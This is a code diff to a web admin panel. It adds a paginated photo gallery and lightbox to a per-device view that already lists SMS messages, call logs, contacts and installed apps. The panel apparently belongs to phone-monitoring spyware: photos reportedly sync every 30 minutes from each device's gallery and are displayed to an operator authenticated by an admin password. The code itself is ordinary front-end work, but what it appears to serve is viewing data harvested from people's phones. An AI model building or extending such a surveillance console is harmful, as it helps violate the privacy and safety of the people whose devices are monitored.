@@ -804,6 +804,12 @@ let contactsCurrentPage = 1;
 // Apps state
 let allApps = [];
 
+// Gallery state
+let allGalleryPhotos = [];
+let galleryCurrentPage = 1;
+let galleryLightboxIdx = 0;
+let galleryFilteredPhotos = [];
+
 async function openDeviceModal(deviceId, deviceName) {
   modalDeviceId = deviceId;
   modalDeviceName = deviceName;
@@ -843,9 +849,12 @@ async function openDeviceModal(deviceId, deviceName) {
   document.getElementById('callsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading call logs...</span></div>`;
   document.getElementById('contactsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading contacts...</span></div>`;
   document.getElementById('appsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading apps...</span></div>`;
+  document.getElementById('galleryGridContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading gallery...</span></div>`;
   document.getElementById('smsPagination').innerHTML = '';
   document.getElementById('callsPagination').innerHTML = '';
   document.getElementById('contactsPagination').innerHTML = '';
+  document.getElementById('galleryPagination').innerHTML = '';
+  document.getElementById('galleryCount').textContent = '';
 
   document.getElementById('deviceModal').classList.remove('hidden');
 
@@ -861,6 +870,8 @@ function closeDeviceModal() {
   allCallLogs = [];
   allContacts = [];
   allApps = [];
+  allGalleryPhotos = [];
+  galleryFilteredPhotos = [];
 }
 window.closeDeviceModal = closeDeviceModal;
 
@@ -876,6 +887,7 @@ function switchDeviceTab(tab) {
   if (tab === 'calls' && allCallLogs.length === 0) loadCallLogs(1);
   if (tab === 'contacts' && allContacts.length === 0) loadContacts(1);
   if (tab === 'apps' && allApps.length === 0) loadApps();
+  if (tab === 'gallery' && allGalleryPhotos.length === 0) loadGallery(1);
 }
 window.switchDeviceTab = switchDeviceTab;
 
@@ -1247,6 +1259,107 @@ function filterApps() {
   renderApps(f);
 }
 window.filterApps = filterApps;
+
+// ========== Gallery Tab ==========
+async function loadGallery(page) {
+  try {
+    galleryCurrentPage = page;
+    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/gallery?page=${page}&limit=50`, {
+      headers: { 'x-admin-password': adminPassword },
+    });
+    const data = await res.json();
+    allGalleryPhotos = data.photos || [];
+    galleryFilteredPhotos = allGalleryPhotos;
+    const total = data.total || 0;
+    const totalPages = data.totalPages || 1;
+
+    document.getElementById('galleryCount').textContent = `${total} photos`;
+    renderGallery(allGalleryPhotos);
+    renderGalleryPagination(page, totalPages, total);
+  } catch (err) {
+    document.getElementById('galleryGridContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD GALLERY</p></div>`;
+    showToast('Failed to load gallery: ' + err.message, 'error');
+  }
+}
+window.loadGallery = loadGallery;
+
+function renderGallery(photos) {
+  const container = document.getElementById('galleryGridContainer');
+  if (!photos || photos.length === 0) {
+    container.innerHTML = `<div class="tab-empty"><i class="ri-image-line"></i><p>NO PHOTOS FOUND</p><span style="opacity:.4;font-size:11px;margin-top:6px">Photos sync every 30 minutes from device gallery</span></div>`;
+    return;
+  }
+
+  container.innerHTML = `<div class="gallery-grid">${photos.map((p, idx) => {
+    const date = p.date_taken ? new Date(p.date_taken).toLocaleDateString() : '';
+    const dims = (p.width && p.height) ? `${p.width}×${p.height}` : '';
+    const sizeKB = p.size ? (p.size / 1024).toFixed(0) + ' KB' : '';
+    const src = p.image_base64 ? `data:image/jpeg;base64,${p.image_base64}` : '';
+
+    return `<div class="gallery-thumb" onclick="openGalleryLightbox(${idx})" title="${esc(p.filename || '')}">
+      ${src ? `<img src="${src}" alt="${esc(p.filename || 'photo')}" loading="lazy">` : `<div class="gallery-thumb-placeholder"><i class="ri-image-line"></i></div>`}
+      <div class="gallery-thumb-overlay">
+        <span class="gallery-thumb-name">${esc(p.filename || 'Unknown')}</span>
+        <span class="gallery-thumb-meta">${[date, dims, sizeKB].filter(Boolean).join(' · ')}</span>
+      </div>
+    </div>`;
+  }).join('')}</div>`;
+}
+
+function renderGalleryPagination(currentPage, totalPages, total) {
+  const el = document.getElementById('galleryPagination');
+  if (totalPages <= 1) { el.innerHTML = ''; return; }
+  let html = '';
+  if (currentPage > 1) html += `<button onclick="loadGallery(${currentPage - 1})"><i class="ri-arrow-left-s-line"></i></button>`;
+  const s = Math.max(1, currentPage - 2);
+  const e = Math.min(totalPages, currentPage + 2);
+  for (let i = s; i <= e; i++) html += `<button class="${i===currentPage?'active':''}" onclick="loadGallery(${i})">${i}</button>`;
+  if (currentPage < totalPages) html += `<button onclick="loadGallery(${currentPage + 1})"><i class="ri-arrow-right-s-line"></i></button>`;
+  el.innerHTML = html;
+}
+
+function filterGallery() {
+  const q = document.getElementById('gallerySearch').value.toLowerCase().trim();
+  if (!q) { galleryFilteredPhotos = allGalleryPhotos; renderGallery(allGalleryPhotos); return; }
+  galleryFilteredPhotos = allGalleryPhotos.filter(p =>
+    (p.filename||'').toLowerCase().includes(q)
+  );
+  renderGallery(galleryFilteredPhotos);
+}
+window.filterGallery = filterGallery;
+
+function openGalleryLightbox(idx) {
+  const photos = galleryFilteredPhotos.length ? galleryFilteredPhotos : allGalleryPhotos;
+  if (!photos[idx]) return;
+  galleryLightboxIdx = idx;
+  const p = photos[idx];
+  const src = p.image_base64 ? `data:image/jpeg;base64,${p.image_base64}` : '';
+  document.getElementById('galleryLightboxImg').src = src;
+  const date = p.date_taken ? new Date(p.date_taken).toLocaleString() : '';
+  const dims = (p.width && p.height) ? `${p.width}×${p.height}` : '';
+  const sizeKB = p.size ? (p.size / 1024).toFixed(0) + ' KB' : '';
+  document.getElementById('galleryLightboxInfo').innerHTML =
+    `<span class="gallery-lb-filename">${esc(p.filename || 'Unknown')}</span>` +
+    `<span class="gallery-lb-meta">${[date, dims, sizeKB].filter(Boolean).join(' · ')}</span>`;
+  document.getElementById('galleryLightbox').classList.remove('hidden');
+}
+window.openGalleryLightbox = openGalleryLightbox;
+
+function closeGalleryLightbox(e) {
+  if (e && e.target !== e.currentTarget) return;
+  document.getElementById('galleryLightbox').classList.add('hidden');
+  document.getElementById('galleryLightboxImg').src = '';
+}
+window.closeGalleryLightbox = closeGalleryLightbox;
+
+function galleryLightboxNav(dir) {
+  const photos = galleryFilteredPhotos.length ? galleryFilteredPhotos : allGalleryPhotos;
+  galleryLightboxIdx += dir;
+  if (galleryLightboxIdx < 0) galleryLightboxIdx = photos.length - 1;
+  if (galleryLightboxIdx >= photos.length) galleryLightboxIdx = 0;
+  openGalleryLightbox(galleryLightboxIdx);
+}
+window.galleryLightboxNav = galleryLightboxNav;
 
 // ========== Export Device Data ==========
 async function exportDeviceData() {
